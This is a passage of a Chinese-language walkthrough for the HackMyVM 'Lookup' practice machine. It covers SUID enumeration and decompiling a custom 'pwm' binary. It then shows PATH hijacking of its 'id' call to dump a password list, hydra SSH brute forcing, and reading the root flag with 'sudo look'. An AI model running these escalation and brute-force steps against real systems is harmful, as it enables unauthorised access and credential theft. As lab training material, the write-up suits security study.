class=\"hljs-number\"\u003e00\u003c/span\u003e\n    inet \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e scope host \n       valid_lft forever preferred_lft forever\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: enp0s17: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc fq_codel state UP group default qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:e7:07:a1 brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e scope \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e dynamic enp0s17\n       valid_lft 456sec preferred_lft 456sec\n    inet6 fe80::a00:27ff:fee7:7a1/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link \n       valid_lft forever preferred_lft forever\n       \n $ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n/snap/snapd/\u003cspan class=\"hljs-number\"\u003e19457\u003c/span\u003e/usr/lib/snapd/snap-confine\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1950\u003c/span\u003e/usr/lib/openssh/ssh-keysign\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/snap/core20/\u003cspan class=\"hljs-number\"\u003e1974\u003c/span\u003e/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/polkit-agent-helper-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/usr/sbin/pwm\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/pkexec\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看见一个没见过的\u003ccode\u003epwm\u003c/code\u003e ，执行看看，好像是要找到\u003ccode\u003e.passwords\u003c/code\u003e文件，但是该用户没有家目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ pwm\n[!] Running \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e command to extract the username \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e user ID (UID)\n[!] ID: www-data\n[-] File /home/www-data/.passwords \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ ls -al /usr/sbin/pwm\n-rwsr-sr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e17176\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e /usr/sbin/pwm\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将文件拉取到靶机\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image125.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eIDA\u003c/code\u003e分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e __fastcall main(\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e argc, const char **argv, const char **envp)\n{\n  char v4; // [rsp+Fh] [rbp-131h]\n  FILE *stream; // [rsp+10h] [rbp-130h]\n  FILE *v6; // [rsp+18h] [rbp-128h]\n  char v7[\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e]; // [rsp+20h] [rbp-120h] BYREF\n  char s[\u003cspan class=\"hljs-number\"\u003e112\u003c/span\u003e]; // [rsp+60h] [rbp-E0h] BYREF\n  char filename[\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e]; // [rsp+D0h] [rbp-70h] BYREF\n  unsigned __int64 v10; // [rsp+138h] [rbp-8h]\n\n  v10 = __readfsqword(0x28u);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"[!] Running 'id' command to extract the username and user ID (UID)\"\u003c/span\u003e);\n  snprintf(s, 0x64uLL, \u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e);\n  stream = popen(s, \u003cspan class=\"hljs-string\"\u003e\"r\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( stream )\n  {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( (unsigned \u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e)__isoc99_fscanf(stream, \u003cspan class=\"hljs-string\"\u003e\"uid=%*u(%[^)])\"\u003c/span\u003e, v7) == \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e )\n    {\n      printf(\u003cspan class=\"hljs-string\"\u003e\"[!] ID: %s\\n\"\u003c/span\u003e, v7);\n      pclose(stream);\n      snprintf(filename, 0x64uLL, \u003cspan class=\"hljs-string\"\u003e\"/home/%s/.passwords\"\u003c/span\u003e, v7);\n      v6 = fopen(filename, \u003cspan class=\"hljs-string\"\u003e\"r\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v6 )\n      {\n        \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e )\n        {\n          v4 = fgetc(v6);\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v4 == -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e )\n            \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n          putchar(v4);\n        }\n        fclose(v6);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n      }\n      \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n      {\n        printf(\u003cspan class=\"hljs-string\"\u003e\"[-] File /home/%s/.passwords not found\\n\"\u003c/span\u003e, v7);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n      }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n    {\n      perror(\u003cspan class=\"hljs-string\"\u003e\"[-] Error reading username from id command\\n\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n    }\n  }\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  {\n    perror(\u003cspan class=\"hljs-string\"\u003e\"[-] Error executing id command\\n\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  }\n\t}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003estream = popen(s, \"r\");\u003c/code\u003e 使用 \u003ccode\u003epopen\u003c/code\u003e 函数执行 \u003ccode\u003eid\u003c/code\u003e 命令，并返回一个 \u003ccode\u003eFILE *\u003c/code\u003e 指针，表示命令的标准输出流\u003c/p\u003e\n\u003cp\u003e但是\u003ccode\u003eid\u003c/code\u003e并没有使用绝对路径，我们可以劫持\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ echo \u003cspan class=\"hljs-string\"\u003e\"#!/bin/bash\"\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n$ echo \u003cspan class=\"hljs-string\"\u003e\"echo 'uid=1000(think) gid=1000(think) groups=1000(think)'\"\u003c/span\u003e \u003e\u003e \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n$ cat \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\necho \u003cspan class=\"hljs-string\"\u003e'uid=1000(think) gid=1000(think) groups=1000(think)'\u003c/span\u003e\n$ export PATH=\u003cspan class=\"hljs-string\"\u003e\"/tmp:$PATH\"\u003c/span\u003e\n$ chmod +x \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e劫持后是一字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ pwm                                     \n[!] Running \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e command to extract the username \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e user ID (UID)\n[!] ID: think\njose1006\njose1004\njose1002\njose1001teles\njose100190\njose10001\njose10.asd\njose10+\njose0_07\njose0990\njose0986$\njose098130443\njose0981\njose0924\njose0923\njose0921\nthepassword\njose(\u003cspan class=\"hljs-number\"\u003e1993\u003c/span\u003e)\njose\u003cspan class=\"hljs-string\"\u003e'sbabygurl\njose\u0026#x26;vane\njose\u0026#x26;takie\njose\u0026#x26;samantha\njose\u0026#x26;pam\njose\u0026#x26;jlo\njose\u0026#x26;jessica\njose\u0026#x26;jessi\njosemario.AKA(think)\njose.medina.\njose.mar\njose.luis.24.oct\njose.line\njose.leonardo100\njose.leas.30\njose.ivan\njose.i22\njose.hm\njose.hater\njose.fa\njose.f\njose.dont\njose.d\njose.com}\njose.com\njose.chepe_06\njose.a91\njose.a\njose.96.\njose.9298\njose.2856171                 \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到字典后保存为\u003ccode\u003epass.txt\u003c/code\u003e开始爆破\u003ccode\u003eSSH\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e ⚡ root@kali  ~/Desktop/test/lookup  hydra -l think -P \u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e.txt -Vv  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e -t \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e ssh\n [\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e][ssh] host: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e   login: think   password: josemario.AKA(think)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003ejosemario.AKA(think)\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - root\u003c/h2\u003e\n\u003cp\u003e登录\u003ccode\u003essh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/lookup  ssh think@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e            \nthink@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 21 Feb 2025 06:16:13 PM UTC\n\n  System load:  0.0               Processes:                201\n  Usage of /:   60.4% of 9.75GB   Users logged in:          0\n  Memory usage: 39%               IPv4 address for enp0s17: 192.168.56.16\n  Swap usage:   0%\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n7 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Thu Jan 11 20:17:32 2024 from 192.168.1.13\nthink@lookup:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录读取到\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@lookup:~$ cat user.txt \n38375fb4dd8baa2b2039ac03d92b820e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@lookup:~$ sudo -l\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e think: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e think on lookup:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser think may run the following commands on lookup:\n    (ALL) /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/look\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接读取RootFlag\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@lookup:~$ sudo look \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e /root/root.txt\n5a285a9f257e45c68bb6c9f9f57d18e8\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Lookup","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMLookup"},"buildId":"KSU3L3f1YqmRGxnWHKn0l","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>